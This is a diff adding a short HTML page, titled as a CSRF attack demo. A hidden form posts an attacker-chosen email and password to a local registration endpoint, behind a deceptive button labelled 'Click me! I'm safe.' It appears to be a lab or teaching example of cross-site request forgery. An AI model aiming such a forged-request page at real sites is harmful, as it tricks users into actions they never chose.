@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head><title>CSRF Attack</title></head>
+<body>
+    <h1>CSRF demo</h1>
+    <form action="http://127.0.0.1:5050/register" method="POST">
+        <input type="hidden" name="email" value="hacker2@example.com">
+        <input type="hidden" name="password" value="Hacker98234!">
+        <button type="submit">Click me! I'm safe.</button>
+    </form>
+</body>    
+</html>
